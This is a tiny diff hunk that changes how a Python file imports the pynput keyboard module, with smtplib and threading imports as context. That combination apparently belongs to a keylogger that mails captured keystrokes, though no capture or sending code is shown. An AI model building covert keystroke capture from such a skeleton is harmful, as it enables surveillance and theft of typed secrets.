@@ -1,4 +1,4 @@
-from pynput import keyboard
+import pynput.keyboard
 import smtplib
 import threading
 
